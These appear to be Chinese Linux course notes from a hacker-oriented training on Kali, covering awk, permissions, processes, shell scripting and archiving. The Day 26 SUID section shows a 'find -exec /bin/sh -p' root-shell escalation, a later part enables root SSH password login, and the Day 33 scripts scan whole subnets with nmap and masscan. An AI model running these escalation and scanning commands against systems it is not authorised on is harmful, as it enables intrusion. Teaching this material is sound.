awk是一种用于处理文本的编程语言工具，是Unix/Linux功能最强大的数据处理引擎，
可以在匹配的行上执行特殊的操作，shell中最常用于截取文本中某一段数据。
同时也是一个格式化的报告生成工具
awk基本结构包括模式匹配(用于找到要处理的行)和处理过程(即处理动作)。
      awk  pattern  {action}
	  匹配模式——执行动作
	  
AWK是一门处理文本文件的语言。它把文件看作一串记录(record)，缺省情况下一行即为一个记录。每一行又被拆成若干域(field)。我们可以把一行中的第一个词看作第一域，第二个词看作第二域，以此类推。一个AWK程序就是一连串“模式——动作”语句。AWK一次读入一行，然后对照程序中的各个模式进行扫描。一旦匹配成功就执行相应的操作(action)


-F   指定字段分隔符
-v  设定一个变量

	 使用变量FS也可以定义字段分隔符
  	 使用单引号把awk程序段引用起来

【案例】

The user $1 home directory is $6


grep false$ passwd | awk -F : '{print "The user " $1 "home directory is " $6}'

awk -F : '/false$/ {print "The user " $1 "home directory is " $6}' /etc/passwd

awk -F : '$7=="/bin/false" {print "The user " $1 "home directory is " $6}' /etc/passwd

awk -v FS=: '$7=="/bin/false" {print "The user " $1 "home directory is " $6}' /etc/passwd

awk -v FS=: '$NF=="/bin/false" {print "The user " $1 "home directory is " $6}' /etc/passwd

变量NF: 当前记录的field个数

23.2.  Comparing Files--文件的比较
（1）comm
逐行比较已排序的文件文件1 和文件2

比较两个文本文件，显示每个文件唯一的行，以及它们共有的行。
它输出三个空格-偏移列:第一个包含对第一个文件或参数唯一的行;
第二行包含对第二个文件或参数唯一的行;
第三列包含两个文件共享的行。
n开关，其中“n”是1、2或3，可以用来抑制一个或多个列，取决于需要。
  -1            不输出文件1 特有的行
  -2            不输出文件2 特有的行
  -3            不输出两个文件共有的行
（2）diff
逐行比较<各文件>，要复杂
它用来比较两个文本文件的差异，是代码版本管理的基石之一
diff -c scan-a.txt scan-b.txt
diff -u scan-a.txt scan-b.txt 

（3）vimdiff
首先要把光标定位在不同处：
do  把另外一窗口不同的内容拿到当前窗口
dp  把当前窗口不同的内容拿到另外一个窗口
]c 跳转到下一个改变
[c 返回到上一个改变
[]
ctrl+w  切换到另一窗口

（4）meld--文件差异比较工具
apt-get update && apt-get install meld

### Day24
更新系统
apt-get update 
apt-get upgrade
收集系统的信息
date -- 查看日期
┌──(root💀kali2)-[~]
└─# date +%F   
2021-10-08

	%F   完整日期格式
案例：
echo "Current time is `命令`" 
//反引号中的命令要优先执行
echo "Current time is $(命令)" 
//$(命令)---其中的命令要优先执行
echo "Current time is `date +%F`"
备份文件加上日期
 cp /etc/hosts hosts.bak.$(date +%F)

cal 
显示当前月份
apt install ncal
-y  指定年份
-m  指定月份
uptime*****
	uptime  gives  a one line display of the following information.  The current time, how long the system has been running, how many users are currently logged on,
       and the system load averages for the past 1, 5, and 15 minutes.
	   
	当前的时间
	系统已经运行了多长时间
	当前登录（在线）的用户数
	过去1、5、15分钟的系统平均负载（load averages）
uptime -p 
top 动态查看进程
w  查看在线用户
who
tty  查看当前的终端
whoami
finger 显示用户的详细信息
 uname -a 显示内核信息
cat /proc/cpuinfo 显示CPU信息

cat /proc/cpuinfo | grep processor

虚拟化指令集 VMX

cat /proc/meminfo 显示内存信息
cat /proc/meminfo  | grep -i ^memtotal  物理内存大小
cat /proc/meminfo  | grep -i ^swaptotal  虚拟内存大小
 df -h 显示文件系统的使用情况
 df -h | grep  -w \/
du -sh   统计当前目录占用磁盘空间大小
free  显示内存和交换分区的大小




























# 笔记（day25-day36)
### Day25**
文件和目录权限的控制
P e r m i s s i o n s
25.1. Linux中常见的权限
r（read）允许查看和打开文件
w（Write）允许查看和编辑文件
x（execute）允许用户执行文件（如脚本、二进制文件等）
ls -ld work
drwxr-xr-x 7 root root 4096  9月  3 09:47 work

ls -l secretfile
-rw-r--r-- 1 root root    0  9月 10 10:23 secretfile
1 2        3  4    5      6   7                 8

1----文件的类型
2----文件的权限
   rw-   r--   ---
   属主（U）  属组（G） 其他人（O）
   rwx   rwx  rwx 
3----链接的数目
4---- 属主
5----属组
6--- 文件大小
7---- 时间
8--文件名

25.2.  更改文件的权限
chmod
 -R, --recursive        递归修改文件和目录
 
（1）Changing Permissions with UGO //表达式

chmod [选项]... 模式[,模式]... 文件...

u 属主
g 属组         （+-=）     文件
o 其他人
a 所有用户


chmod u+x  file  //给属主添加执行权限
chmod u-x file   //把属主执行权限去除
chmod u=x file   //给属主赋予执行权限（属主只有执行权限）


chmod a+w /exam/file   //给所有用户添加写权限
chmod +w /exam/file   //只是给属主添加写权限
chmod +x /exam/file   //给所有用户添加执行权限


chmod u=rw,g=rw,o=r /exam/file

chmod u+x donnie_script.sh
chmod g+x donnie_script.sh
chmod o+x donnie_script.sh
chmod u+x,g+x donnie_script.sh
chmod a+x donnie_script.sh

（2）Changing Permissions with Decimal Notation //数字

chmod [选项]... 八进制模式 文件...

r（read）允许查看和打开文件  4
w（Write）允许查看和编辑文件 2
x（execute）允许用户执行文件 1（如脚本、二进制文件等）


rwx  rwx  rwx 
属主 属组 其他人

7    0    6
rwx ---   rw-

664  rw-rw-r--
777  rwxrwxrwx
755  rwxr-xr-x
400
600
644
000

25.3 stat 查看文件的详细信息

stat file      
  文件：file
  大小：42              块：8          IO 块：4096   普通文件
设备：801h/2049d        Inode：2756675     硬链接：1
权限：(0141/---xr----x)  Uid：(    0/    root)   Gid：(    0/    root)
最近访问：2021-10-09 09:57:48.150117453 +0800
最近更改：2021-10-09 09:57:12.730116333 +0800
最近改动：2021-10-09 10:05:17.446131654 +0800
创建时间：2021-10-09 09:57:12.730116333 +0800

 stat -c %a file 以数值显示文件的权限

### Day26**

26.1. Setting More Secure Default Permissions with Masks
通过umask设置文件（目录）默认权限
Linux系统默认为文件分配的权限如下（基本权限）：
文件  666  rw-rw-rw-
      644
目录  777  rwxrwxrwx
      755
可以通过umask把相应的权限从Linux基本权限中掩去

对于个人用户也可以自定义自己的umask值，建议写在用户家目录中的.profile文件中

26.2 更改文件的属主和属组
Granting Ownership to an Individual User
 useradd 
  -m, --create-home             创建用户的主目录
  -M, --no-create-home          不创建用户的主目录

useradd -m user1
groupadd jn

把用户加入到组
方法1： gpasswd

gpasswd -a user1 jn
	-a 加入组
	-d 从组中移除
方法2： usermod 
	usermod -G jn user1

groups 
  查看所属的组
  
更改(change)文件的属主(Owner)
chown
	-R  递归

chown user1 test01 

更改文件的属组

方法1：chgrp
	-R  递归

	chgrp jn test01
方法2：
	chown 属主:属组  文件

	chown :属组  文件


26.3. Special Permissions 特殊的权限
（1）Granting Temporary Root Permissions with SUID
 通过SUID位给用户临时root权限
 当执行设置了SUID位的程序时，是以该程序的属主身份执行，而不是当前用户
 SUID---冒险位—4—作用于属主
 ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 63960  2月  7  2020 /usr/bin/passwd

 Da163.com0
 suid sgid sticky rwx rwx rwx
 4    2     1
 
 chmod u+s /usr/bin/passwd
 chmod 4755 /usr/bin/passwd
 
如何在系统中查找哪些文件设置了SUID位？
find / -perm -u=s -type f   2>/dev/null  
find / -perm -4000 -type f  2>/dev/null *****


find -name f1 -exec ls -l {} \;
 
find -name f1 -exec /bin/sh \; 
find -name f1 -exec /bin/sh -p \;
//-exec  对找到的文件执行指定的命令，以;结束（;号前要加转义符\）
高版本的Linux中，如果启动bash的Effective（有效的） UID与Real（真实的） UID不相同，而且没有使用-p参数，则bash会将Effective UID 还原成Real UID
find -name f1 -exec /bin/bash  \;

bash的Effective（有效的） UID---root用户
Real（真实的） 如普通用户UID---user01

$ cd /tmp
$ touch f1
$ ls -l f1
-rw-r--r-- 1 user1 user1 0 10月 10 11:12 f1
$ find -name f1
./f1
$ find -name f1 -exec ls -l {} \;    
-rw-r--r-- 1 user1 user1 0 10月 10 11:12 ./f1
$ find -name f1 -exec /bin/sh \;
$ find -name f1 -exec /bin/sh -p \;

find / -user root -perm -4000 

查找suid位且属主是root用户的文件  

### Day27**
27.1. SGID

SGID  2---作用于属组
chmod 2755 file
SGID针对命令程序的作用
1.只有可执行二进制程序才能设置SGID权限
2.命令执行者要对该程序拥有执行(x)权限
3.命令执行者在执行程序的时候,组身份升级为该可执行程序文件的属组
4.SGID权限只在该程序执行过程中有效,也就是组身份只在程序执行过程中发生改变,命令结束用户组身份恢复.

如果一个目录设置了SGID位，则目录中新产生的文件都会继承目录的属组身份*****

SGID针对目录的作用
1.普通用户必须对该目录拥有rx权限,才能进入此目录
2.普通用户在该目录中的有效组会变成该目录的属组
3.若普通用户对此目录拥有
小练习
groupadd security 
chgrp security /exam   
chmod g+s /exam  
ls -ld /exam   
touch /exam/f9 
cp /etc/hosts /exam 
ls -l /exam

chmod g+s /exam
chmod 2755 /exam
find / -perm -4000 -type f 2>/dev/null 
在系统中查找设置了sgid位的目录
find / -perm -2000 -type d 2>/dev/null 
在系统中查找设置了sgid位的文件
find / -perm -2000 -type f 2>/dev/null 
find / -perm -4000 -type f 2>/dev/null

find / -perm 2000 -type f 2>/dev/null 
在系统中查找设置了suid位或sgid位的文件？

find 
	逻辑或 -o (meaning logical OR) ，条件只要满足其中之一即可
	逻辑与 and -a (meaning logical AND) ，默认，条件必须都要满足

find / -perm -2000 -o -perm -4000 -type f 2>/dev/null 
find / -type f \( -perm -4000 -o -perm 2000 \) 2>/dev/null
find / -perm -6000 -type f 2>/dev/null 
在系统中监视文件权限的变化，如发现系统中有无异常的suid位或sgid位的程序？
find / -perm -2000 -o -perm -4000 -type f 2>/dev/null >suid_sgid_1.txt


27.2. The Outmoded Sticky Bit（粘连位）

Stick  粘连位 1  作用于其他人
chmod o+t  dir
通常用于目录（公共的目录），每个人只管理自己的文件，但root用户除外
find / -perm -1000 -type d  2>/dev/null
ls -ld /tmp        
drwxrwxrwt 16 root root 4096 10月 11 10:11 /tmp
                                                         

27.3. 进程管理
进程只是一个正在运行和使用资源的程序。进程的管理包括：
查看
查找
发现占用系统资源比较多的进程
管理后台的进程
进程优先级的调整
结束进程
进程调度（周期）执行

（1）Viewing Processes--进程的查看
1）ps

 ps - report a snapshot of the current processes.

2）ps  aux //查看所有进程的详细信息
init进程（systemd） 是系统调用的第一个进程，编号为1，也是所有进程的父进程

3） ps -elf  //查看所有进程的详细信息（优先级，父进程等）

4）查看某个用户运行的进程
ps -u 用户 
ps -U 用户

5）查看指定的进程

 ps -p "1 2" -p 3,4
 
 ps -p "2 6" 
 ps -p 2,6
 1 ⨯
    PID TTY          TIME CMD
      2 ?        00:00:00 kthreadd
      6 ?        00:00:00 kworker/0:0H-events_highpri
      9 ?        00:00:00 mm_percpu_wq
     10 ?        00:00:00 rcu_tasks_rude_



3）pstree 查看进程树



### Day28**


28.1. Filtering by Process Name

根据进程的名字进行过滤
pid

Metasploit（msf） exploitation framework
 漏洞利用框架
banner--旗标
	msfconsole//启动msf的控制台
	
ps aux | grep msfconsole
ps aux | egrep ("sshd"|"apache2") 
ps aux | grep -E ("sshd"|"apache2") 
	 
28.2. Finding the Greediest Processes with top
使用top找到占用资源比较多的进程
动态查看进程，默认每3秒钟刷新一次
list dynamically—by default, every 5 seconds

（1）交互
 H or ? 

 d
 k  杀死一个进程
 r  调整进程的优先级
 l  查看系统的平均负载
 t  按照cpu占用（时间）排序
 P  以cpu的使用资源排序
 M  按照内存占用排序
 

（2）选项

-d  设定更新间隔（秒）




（3）程序的管理

程序之间是可以互相控制的！
通过给予该程序一个信号 （signal） 去告知该程序你想要让她作什么

查看常用的信号值
 kill -l （小写的 L ） 或者是 man 7 signal 
常用的信号值：
15/sigterm  正常结束一个进程,默认
9/sigkill   强制结束一个进程，副作用会有一些半成品（如交换文件.swp产生）
1/sighup    常用于重启一个服务进程，重新读取服务的配置文件
2/sigint    相当于ctrl-c 中断一个程序的运行
19/sigstop  相当于ctrl-z ,把程序放在后台并停止运行


28.3.  结束一个进程

kill [信号] 进程id（pid）


28.4 根据程序名查看进程号
pidof  程序名


28.5. 查看后台任务
jobs 

28.6.  把后台任务调入前台运行
fg 任务编号

28.7. 把后台停止任务启动
bg  任务编号 

 ping 192.168.195.15 &



### Day29**

29.1  Kali中配置启用ssh服务，并允许root用户可以使用口令认证进行远程登录 


（1）ssh服务
更安全的远程登录方式
 22/tcp    // netstat -tnlp | grep ":22"
 进程名: sshd  //ps aux | grep sshd 
 
Step01: 启动ssh服务
	systemctl start ssh
Step02: 把ssh服务设置为开机启动
	systemctl is-enabled ssh  //查询ssh服务是否开机启动   
	systemctl enable ssh
Step03: 使用终端工具远程连接Kali
		xshell
Step04 编辑ssh服务配置文件
     /etc/ssh/sshd_config
cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak.$(date +%F)
cp /etc/ssh/sshd_config /etc/ssh/sshd_config.src.$(date +%F)
添加这一行
PermitRootLogin yes

Step05 重启ssh服务
	systemctl restart ssh 

kill -1 $(ps aux | grep 'sshd' | grep -v grep | awk '{print $2}')
kill -SIGHUP $(ps aux | grep 'sshd' | grep -v grep | awk '{print $2}')

ps aux | grep msfconsole
ps aux | egrep ("sshd"|"apache2") 
ps aux | grep -E ("sshd"|"apache2") 

kill -SIGHUP $（ps aux | grep 'rsyslogd' | grep -v 'grep'| awk '{print $2}'）

### Day30**
1. 进程的常见状态

R （Running）：该程序正在运行中；
S （Sleep）：该程序目前正在睡眠状态（idle），但可以被唤醒（signal）。
D ：不可被唤醒的睡眠状态，通常这种程序可能在等待 I/O 的情况（ex>打印）
T ：停止状态（stop）
Z （Zombie）：僵尸状态，程序已经终止但却无法从内存被移除

2. 结束进程
kill -信号  进程号

killall -信号 程序名 
15
9 
	结束进程树
【案例】踢掉一个非法用户	
pkill
	-u 用户名  踢掉一个在线用户


pgrep -u user2
	根据指定用户过滤进程
	
PS: vi test.txt &

&  把程序放在后台运行



30.2 进程优先级调整

优先执行序 （priority, PRI） 这个 PRI 值越低代表越优先的意思

PRI（new） = PRI（old） + nice
nice 值可调整的范围为 -20 ~ 19 ；
root 可随意调整自己或他人程序的 Nice 值，且范围为 -20 ~ 19 ；
一般使用者仅可调整自己程序的 Nice 值，且范围仅为 0 ~ 19 （避免一般用户抢占系统资源）；
一般使用者仅可将 nice 值越调越高，例如本来 nice 为 5 ，则未来仅能调整到大于 5；

nice
	在运行进程时设置优先级
	nice -n 10 ping 127.0.0.1
	ps -lef | grep ping

renice
	使用 renice 命令改变正在运行的进程优先级
    renice -5 2299 


top -u 用户名
查看指定用户的动态进程列表

30.3 把程序放在后台执行

程序 &
fg 程序名 调入前台
bg 程序名 把后台的停止的任务启动

30.4. 任务的调度（安排任务在什么时间执行）

Scheduling Processes
一次性调度  服务 atd
周期性调度 服务 crond



apt install at

at now + 5 minutes  
at> /root/work/exam/day30/at_exam01.sh
at>（ctrl+d）




atq  查询任务计划
atrm 任务编号 删除任务



### Day31**Chapter 7 管理用户环境变量
环境变量，效果（性能、便利、隐蔽）

31.1 变量的概念
变量就是命名的内存地址空间（命名的容器），用于存放各种类型的数据
（1）变量赋值
变量名＝变量值
KEY=value
（2）显示变量
echo　 ${变量名}
31.2. 环境变量
环境变量是构建在系统和接口中的系统范围的变量，它们
控制用户对系统的外观、行为和“感觉”，并且它们由任何子 shell 或进程继承。
（3）取消一个变量

  unset 变量名
PS: export 变量

	把变量导出为全局（环境）变量

31.2. 查看所有默认的环境变量
env
31.3. 查看所有变量,包括 shell 变量、本地变量和 shell 函数(如任何用户定义的变量和命令别名)
set 

31.4. 修改环境变量

方法1：直接修改，用export导出
方法2：修改环境变量配置文件

建议在修改环境变量之前，对系统变量进行备份
 set > ~/work/bak/sys_var.txt


HISTSIZE
	定义历史命令的个数
	
set | grep HISTSIZE


history
查看历史命令


31.5 有关的环境变量配置文件
全局
	/etc/profile
    /etc/profile.d/*.sh
	/etc/bash.bashrc（Kali）
	/etc/bashrc
用户
   用户家目录中
   .profile
   .bashrc 
   .zshrc*****仔细研读
   .viminfo---vi编辑器工作环境

   
PS:  source .zshrc  
     重新读取脚本文件
	 
	 
31.6 更改 SHELL 提示符

HISTSIZE

通过设置 PS1 变量的值来更改默认 shell 提示符中的名称。*****
PS2 ---二级提示符

```
`┌──(root💀kali2)-[~]
└─# echo $PS1     
%F{%(#.blue.green)}┌──${debian_chroot:+($debian_chroot)─}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))─}(%B%F{%(#.red.blue)}%n$prompt_symbol%m%b%F{%(#.blue.green)})-[%B%F{reset}%(6~.%-1~/…/%4~.%5~)%b%F{%(#.blue.green)}]
└─%B%(#.%F{red}#.%F{blue}$)%b%F{reset} 
```




PS1 变量有一组占位符，用于显示希望在提示符中显示的信息，包括以下内容:
//bash支持以下占位符
\u 当前用户的名称
\h 主机名
\W 当前工作目录的基本名称
\w  显示完整工作目录

zsh 目前看起来不支持以上占位符

【案例】
PS1="World's Best Hacker: #" ---Kali

export PS1='C:\w> '  -Centos



31.7 改变你的 PATH变量

PATH 变量，它控制您的 shell 将在系统的哪个位置查找您输入的命令，


/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games

向PATH变量添加一个新的路径，避免把一个目录直接赋值给PATH变量
PATH=$PATH:新的路径
`


### Day32**Chapter 8 shell脚本

Any self-respecting hacker must be able to write scripts
作为一名黑客必须具备脚本编写的能力，至少要掌握（熟悉）一门编程语言

bash shell scripts（Shell脚本编写的能力）

32.1 Your First Script: “Hello, Hackers-Xiaofeixia!” 
写出第一个脚本

#!/bin/bash //脚本的第一行
	要告诉您的操作系统您想为脚本使用哪个解释器。
	#!/usr/bin/python3 
	添加注释的好处：
	 对脚本语句的说明（脚本是为了做什么以及编写的思路、说明等）
echo "Hello, Hackers-xiaofeixia!"

PS:shell脚本的扩展名通常以sh结尾

第一个脚本案例

first_script.sh 

#!/bin/bash
This is xiaofexia first script
echo "Hello, Hackers-xiaofeixia!"

给脚本添加可执行权限

chmod +x first_script.sh 

脚本的执行
  ./first_script.sh
  PS1:文件名前的./告诉系统我们希望在first_script.sh所在的当前目录文件中执行此脚本。
  
  PS2:它还告诉系统，如果在另一个名为 first_script.sh的目录中有另一个文件，请忽略它，只在当前目录中运行first_script.sh。
  
  PS3:在执行脚本时使用 ./脚本名称 是一个很好的实践
  

  sh first_script.sh （路径）


32.2. 脚本进阶1

写一个“带有变量和用户输入的功能”的脚本

#!/bin/bash
readname
echo -n "First Name:"
read firstname
echo -n "Last Name:"
read lastname
echo
echo -e "Your First Name is: ${first}\n"
echo -e "Your Last Name is: ${lastname}\n"


脚本优化
#!/bin/bash
readname
read -p in zsh is not support
read -p "First Name: " firstname
read -p "Last Name: " lastname
echo 
echo -e "Your First Name is: ${firstname}\n"
echo -e "Your Last Name is: ${lastname}\n"



#!/bin/bash
This is my second bash script
echo  "What is your name:"
read name
echo  "What chapter are you on in Linux Basics for Hackers?"
read chapter
echo
echo -e "Welcome ${name} to Chapter ${chapter} of Linux Basics for Hackers!\n"

PS: 脚本的调试开关*****
    -x 
  bash -x 脚本的名字

32.3. 补充 Keyboard Shortcuts （BASH中常用的快捷键）

向上光标键  ---调用最后一次执行的命令
ctrl+R   在历史命令中根据关键字查找指令进行调用*****
	找到之后可以再按ctrl+r继续往下查找 
Ctrl + Z  把程序放在后台并停止运行
Ctrl + C  终止当前命令的执行 
Ctrl + L ==clear 清屏
!! 重复上一条命令
command | less 允许你使用上下光标键滚动屏幕查看命令执行结果
!$（ESC+.） 重复上一个命令的最后一个参数
Ctrl + A （Home） 回到命令行的行首
Ctrl + E（END）   回到命令行的行尾
Ctrl + U   删除光标前的所有内容，并且放到剪切板
Ctrl + K   删除光标后的所有内容，并且放到剪切板
Ctrl + Y   粘贴 ，配合Ctrl + K 和Ctrl + U使用
Ctrl + T   交换光标前后的字符
Ctrl + W   删除光标前的一个单词或参数
Ctrl + D  退出当前终端
Ctrl + <--  向左移动一个单词
Ctrl + -->  向右移动一个单词

### Day33**Chapter 8 shell脚本进阶

33.1. 第一个黑客脚本:扫描开放的端口（一个简单的扫描器）

Gray hacker

nmap---网络扫描工具
基本语法 
 nmap [Scan Type(s)] [Options] {target specification}
 nmap [扫描类型][扫描选项] {扫描目标}
 
 -sT  完全连接扫描 （TCP的三次握手）
 -p  指定要扫描的端口
 -oG 把扫描结果分类保存
 
 nmap -sT  -p 21 192.168.4.238
 nmap -sT  -p 21 192.168.4.0/24
 
 MySQL 使用端口 3306
 ftp   使用端口 21
 远程桌面  使用端口 3389
 
 nmap -sT 192.168.181.0/24 -p 3306  >/dev/null  -oG MySQLscan
 

#!/bin/bash
This scripts is to scan LAN 21 port
nmap -sT 192.168.4.1-254 -p 21 >/dev/null -oG myscantmp.txt
cat myscantmp.txt | grep open | awk '{print $2}' >myscan.txt
cat myscan.txt

33.2. 改进我们的扫描器

使其不仅适用于您自己的本地网络。如果该脚本能够提示用户想要扫描的 IP 地址范围和要查找的端口，

#!/bin/bash
This scripts is to scan LAN 21 
echo -n "Please Input you scan network(eg:192.168.1.):"
read ipnet
echo -n "Please Input you scan start ip(eg:1):"
read firstip
echo -n "Please Input you scan end ip(eg:100):"
read lastip
echo -n "Please Input you scan port(eg:80)"
read port
nmap -sT ${ipnet}${firstip}-${lastip} -p $port >/dev/null -oG myscantmp.txt
cat myscantmp.txt | grep open | awk '{print $2}' >myscan.txt
cat myscan.txt

学生的改进1（有不足，逻辑）

 #!/bin/bash
read -p "Please enter the IP you are Scanning for: " IP
read -p "Please enter the port you want to scan: " port
masscan -p 1-65535 --rate 5000  ${IP} > scan_var.txt
cat scan_var.txt | cut -d" " -f4 | cut -d/ -f1 > port.txt
echo -n `cat port.txt` > port-a.txt
cat port-a.txt | sed s/" "/,/g > port-b.txt
echo `cat port-b.txt`
read -p "Which port do you want to view the details of? (eg:3389): " PORT
PORT=`cat port-b.txt`
nmap -sV -p ${PORT} -T4 -A ${IP} -oG scanvar.txt
	-sV    查看服务的版本
	-T4    快速的扫描
	-A     综合扫描 
山东新华十大匠师、2020.7月教师之星、济南广电大赛优秀指导教师、2020年中国软件专业人才优秀教师
masscan+nmap 结合的脚本

PS:masscan  快速的扫描工具
	-p
	--rate  指定扫描的速率，每秒钟发多少个包
	
学生的改进2

#!/bin/bash
echo 'masscan to load...........'
var=$(arp-scan -l | head -5 | tail -3 | awk '{print $1}')
for ip in $var
do
	masscan -p 0-65535 --rate 4000 $ip > masscan.txt
done
echo 'namp to load...........'
var2=$(cat masscan.txt | awk '{print $4}' | awk -F/ '{print $1}' )
var3=$(cat masscan.txt | head -1 | awk '{print $6}')
for port in $var2
do
		nmap -sV $var3 -p $port >> nmap.txt
done
cat nmap.txt	


### Day34**Chapter 9 压缩和归档（打包）
34.1. 压缩是什么?
将压缩分类为有损或无损
.mp3、 .mp4、 .png 和.jpg 都是有损压缩算法
有损压缩的优点是它的效率和有效性。压缩比是非常高，这意味着生成的文件比原始文件小得多。

但是对于黑客来说，完整性通常比压缩比重要得多

34.2. 将文件存档在一起（打包）
工具:tar  *****
 tar 命令把许多文件归档创建为一个文件，然后将其称为归档文件、 tar 文件或 tar 包。
GNU 'tar' saves many files together into a single tape or disk archive, and can
restore individual files from the archive.
常用的选项
	-c, --create                创建一个新归档
    -f, --file=ARCHIVE          指定归档文件
	-v  查看详细信息
	-t, --list                 列出归档内容
    -x, --extract, --get       从归档中解出文件
	-r, --append               追加文件至归档结尾
压缩选项:

  -a, --auto-compress        使用归档后缀名来决定压缩程序
  -I, --use-compress-program=PROG
                             通过 PROG 过滤(必须是能接受 -d
                             选项的程序)
-j, --bzip2                通过 bzip2 处理归档
-J, --xz                   通过 xz 处理归档
      --lzip                 通过 lzip 过滤归档
      --lzma                 通过 xz 过滤归档
      --lzop                 通过 lzop 过滤归档
      --no-auto-compress     不使用归档后缀名来决定压缩程序
      --zstd                 通过 zstd 过滤归档
-z, --gzip, --gunzip, --ungzip   通过 gzip 处理归档
-Z, --compress, --uncompress   通过 compress 处理归档


-C, --directory=DIR        改变解压目标位置


  tar -cf archive.tar foo bar  # Create archive.tar from files foo and bar.
  tar -tvf archive.tar         # List all files in archive.tar verbosely.
  tar -xf archive.tar          # Extract all files from archive.tar.


练习
mkdir day34;cd day34
cp /etc/hosts .  
cp /etc/resolv.conf . 
cp /etc/network/interfaces .

tar -cf  net_config.tar hosts resolv.conf interfaces
//把多个文件打包成一个tar包

tar -tvf  net_config.tar 
//从tar包中显示这些文件，而不需要提取它们

tar -xf net_config.tar 
// 解包

cp /etc/ssh/sshd_config .  

tar -rf net_config.tar sshd_config 
//把文件追加到包文件中    


34.3 对包文件进行压缩

gzip，它使用扩展名.tar.gz 或.tgz
bzip2，它使用扩展名.tar.bz2
compress，它使用扩展名.tar.z
compress 是最快的，但是生成的文件是更大的； bzip2 是最慢的，但是生成的文件是最小的；
gzip 介于两者之间

（1）gzip
它是 Linux 中最常用的压缩实用程序
gzip [OPTION]... [FILE]...

gzip net_config.tar （压缩）

ls -lh             
-rw-r--r-- 1 root root 2.0K 10月 20 11:06 net_config.tar.gz


解压缩（-d）
 方法1： gzip -d net_config.tar.gz
 方法2： gunzip net_config.tar.gz 

 
### Day35**Chapter 9 压缩和归档（打包）2

cp /etc/hosts .  
cp /etc/resolv.conf . 
cp /etc/network/interfaces . 
cp /etc/ssh/sshd_config .
 .tar.gz 
.tgz      

tar -xzf net_config.tar.gz  
tar -tvzf net_config.tar.gz 
tar -czf net02.tar.gz hosts resolv.conf interfaces sshd_config 

35.2. 用 bzip2 压缩

解压缩
bzip2 -d net_config.tar.bz2
bunzip2 net_config.tar.bz2 

bzip2+tar 

.tar.bz2   tar xjf  
.tar.gz    tar xzf 

案例
	apache---Web服务程序  httpd
	 HTTP Server ("httpd") 
	
	http://httpd.apache.org/

wget https://dlcdn.apache.org//httpd/httpd-2.4.51.tar.gz  

需求1:如何校验下载文件的完整性？

hash算法---hash值（指纹）的比对校验下载文件的完整性
SHA-2（SHA-256、SHA-512等）

sha256sum httpd-2.4.51.tar.gz

sha256sum -c httpd-2.4.51.tar.gz.sha256
需求2：要把本地文件上传到远程的Linux服务器上？

小文件： 
	方法1 推荐使用lrzsz软件包提供的程序
	//apt-get install lrzsz

		 rz  --接收文件
		 sz  --发送文件

大文件： Winscp 、xftp等类似的工具（原理：利用sftp协议实现与远程Linux交互）



需求3： tar.gz 或 tar.bz2 文件的解压
tar xzf 
tar xjf 

### Day36**Chapter 9 压缩和归档（打包）2

36.1. 用 compress 压缩（不常用）

compress httpd2.tar 

格式：.tar.Z

compress 是最快的，但是生成的文件是更大的； bzip2是最慢的，但是生成的文件是最小的；
gzip 介于两者之间。
─(root💀kali2)-[~/work/exam/day36]
└─# ls -lh                 
总用量 75M
  16M 10月 22 09:05 httpd2.tar.Z   compress -d   uncompress    tar xZf
 7.3M 10月 22 09:09 httpd3.tar.bz2 bzip2 -d      bunzip2       tar xjf  tar xaf
 9.5M 10月 22 09:10 httpd4.tar.gz  gzip -d       gunzip        tar xzf
  43M 10月  7 23:17 httpd.tar

36.2. .7z格式压缩文件
hashcat--高级的密码（hash口令）破解工具
https://hashcat.net/hashcat/

7z
7za

7za x hashcat-2.00.7z -r -o./

x  代表解压缩文件，并且是按原始目录树解压
-r 表示递归解压缩所有的子文件夹
-o 是指定解压到的目录，-o后是没有空格的，直接接目录。这一点需要注意。


36.3. tar.xz

-J, --xz                   通过 xz 处理归档


36.4. 创建存储设备的物理副本
dd 命令逐个比特位复制文件、文件系统，甚至整个硬盘驱动器。这意味着即使删除的文件也会被复制
对存储设备进行物理复制
cp 不会复制删除的文件
典型的应用：
（1）磁盘完整的副本制作
（2）电子取证
（3）dd 命令不应该用于典型的文件和存储设备的日常复制，因为它非常慢，其他命令执行
起来更快、更有效
基本用法 
   dd if=输入文件 of=输出文件
常用选项
	bs=单位大小  默认是512字节（bs 选项允许您确定要复制的数据的块大小(每个块的读/写字节数)）
	count=N      指定单位的数量
	noerror ：即使遇到错误， noerror 选项也会继续复制。
              copy only N input blocks

┌──(root💀kali2)-[~/work/exam/day36]
└─# dd bs=1M count=10 if=/dev/zero of=f1
记录了10+0 的读入
记录了10+0 的写出
10485760字节（10 MB，10 MiB）已复制，0.00539446 s，1.9 GB/s
                                                                                                                                                                            
┌──(root💀kali2)-[~/work/exam/day36]
└─# ls -lh f1         
-rw-r--r-- 1 root root 10M 10月 22 10:24 f1

【案例2】为指定U盘做一个副本
dd if=/dev/sdb of=/root/flashcopy	

【案例3】
dd if=/dev/media of=/root/flashcopy bs=4096 conv=noerror
	
【备份MBR】
dd if=/dev/sda of=/root/image count=1 bs=512




# 笔记(day37-day40)

2021.10月份每日分享.方向
1. 分享常用的Linux命令（重点）
2. 分享 英文单词
3. 分享 最近安全热点
4. 分享 小技巧
### *Day37*
tar cvzf    tar.gz
tar cvjf    tar.bz2

tar tvf

tar xvzf   tar.gz
tar xvjf   tar.bz2
tar xvaf
第10章 文件系统和存储设备的管理
10.1 对存储设备的表示

Linux 中的每个设备都由/dev 目录中的文件表示
ls -l | grep -v "总" |  cut -c1 | sort  | uniq -c

设备类型主要有两种
block （块设备）-b---存储设备
character（字符设备）c--如终端


软盘 fd0
硬盘
 hdx  使用 IDE 或 E-IDE接口
 sdx  使用SATA、SCSI接口（U盘也认为是SATA设备）
	sda 第一个sata硬盘驱动器  /dev/sda
 sr0  光盘驱动器（使用SATA、SCSI接口）
 /dev/cdrom是/dev/sr0的快捷方式
 ┌──(root💀kali2)-[~]
└─# ls -l /dev/cdrom
lrwxrwxrwx 1 root root 3 10月 25 10:25 /dev/cdrom -> sr0

硬盘分区
  有四个分区（主分区）编号（1-4）
  
  引入了扩展分区（可以在扩展分区中划分逻辑分区），扩展分区占用一个主分区编号 
  逻辑分区的编号从5开始
  
  /dev/sda1
  MBR（硬盘的第一个扇区，512字节）主引导记录
  由操作系统引导程序+分区表+扇区结束标志
     446              64      2
